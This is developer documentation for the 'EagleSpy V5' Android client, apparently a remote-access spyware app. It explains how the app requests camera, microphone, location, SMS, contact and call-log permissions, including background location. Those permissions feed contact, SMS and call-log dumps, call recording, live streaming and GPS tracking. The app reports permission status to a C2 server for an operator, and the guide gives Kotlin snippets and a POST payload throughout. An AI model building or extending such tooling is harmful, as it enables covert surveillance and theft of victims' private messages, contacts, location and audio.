# Permission Handling Guide

## Overview

EagleSpy V5 Android client uses a centralised `PermissionManager` for all
runtime permission requests. It handles:

- Android 6+ (API 23) runtime permissions
- Android 13+ (API 33) granular media permissions
- Graceful degradation when permissions are denied
- Permission status monitoring and server reporting

## Architecture

```
PermissionManager (singleton)
├── Checks & requests permissions
├── Tracks request history (SharedPreferences)
├── Builds PermissionStatus snapshots
└── Reports status to C2 server

PermissionStatus (data class)
├── Per-permission state (granted / rationale / permanently denied)
├── Feature availability flags
├── JSON serialisation for server reporting
└── Timestamp for freshness tracking
```

## Files

| File | Purpose |
|------|---------|
| `utils/PermissionManager.kt` | Runtime permission requests, status monitoring, server reporting |
| `utils/PermissionStatus.kt` | Data class for permission state, JSON serialisation |

## Permission Groups

### Critical Permissions (requested on startup)

| Permission | Feature |
|------------|---------|
| `CAMERA` | Photo capture, live streaming |
| `RECORD_AUDIO` | Microphone recording, call recording |
| `ACCESS_FINE_LOCATION` | GPS tracking, geofencing |
| `ACCESS_COARSE_LOCATION` | Approximate location |
| `READ_CONTACTS` | Contact dump |
| `READ_CALL_LOG` | Call log dump |
| `READ_SMS` | SMS dump |
| `READ_PHONE_STATE` | Device info |

### Android 13+ Media Permissions

| Permission | Replaces |
|------------|----------|
| `READ_MEDIA_IMAGES` | `READ_EXTERNAL_STORAGE` (images) |
| `READ_MEDIA_VIDEO` | `READ_EXTERNAL_STORAGE` (video) |
| `READ_MEDIA_AUDIO` | `READ_EXTERNAL_STORAGE` (audio) |
| `POST_NOTIFICATIONS` | Implicit (notifications) |

### Background Location (requested separately)

`ACCESS_BACKGROUND_LOCATION` must be requested **after** foreground location
is granted (Android 10+ requirement).

## Usage

### Auto-request on Activity start

```kotlin
class SetupWizardActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Request all critical permissions
        PermissionManager.requestCriticalPermissions(this)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        PermissionManager.onPermissionsResult(this, requestCode, permissions, grantResults)

        // After critical perms, request background location
        if (requestCode == PermissionManager.REQUEST_CODE_CRITICAL) {
            PermissionManager.requestBackgroundLocation(this)
        }
    }
}
```

### Check feature availability before use

```kotlin
// Before taking a photo
if (PermissionManager.isGranted(context, Manifest.permission.CAMERA)) {
    takePhoto()
} else {
    Timber.w("Camera permission not granted — skipping photo")
}

// Or check all features at once
val features = PermissionManager.getAvailableFeatures(context)
if (features["camera"] == true) { ... }
```

### Report to server

```kotlin
// In a coroutine scope (e.g., inside a Worker or Service)
PermissionManager.reportStatusToServer(applicationContext)
```

The report is sent as a POST to:
```
POST /api/devices/{device_id}/permissions
Authorization: Bearer {device_token}
Content-Type: application/json
```

Payload:
```json
{
  "device_id": "abc123",
  "android_version": 34,
  "timestamp": 1700000000000,
  "permissions": {
    "android.permission.CAMERA": {
      "granted": true,
      "should_show_rationale": false,
      "permanently_denied": false
    },
    "android.permission.READ_SMS": {
      "granted": false,
      "should_show_rationale": false,
      "permanently_denied": true
    }
  }
}
```

## Graceful Degradation

When a permission is denied, the corresponding feature is automatically
disabled. Services should check `PermissionManager.isGranted()` or
`PermissionStatus.availableFeatures()` before attempting restricted operations.

| Denied Permission | Degraded Feature |
|-------------------|------------------|
| `CAMERA` | No photo capture or live streaming |
| `RECORD_AUDIO` | No mic recording or call recording |
| `ACCESS_FINE_LOCATION` | Falls back to coarse location, then disabled |
| `READ_CONTACTS` | Contact dump returns empty |
| `READ_SMS` | SMS dump returns empty |
| `READ_CALL_LOG` | Call log dump returns empty |
| `READ_MEDIA_*` | File browser limited to app-private storage |

## Permanently Denied Detection

A permission is considered **permanently denied** when:
1. It is not granted
2. `shouldShowRequestPermissionRationale()` returns false
3. The permission was previously requested (tracked in SharedPreferences)

In this state, the user must manually grant the permission from device Settings.
The manager reports this state to the server so the operator knows which features
are unavailable.
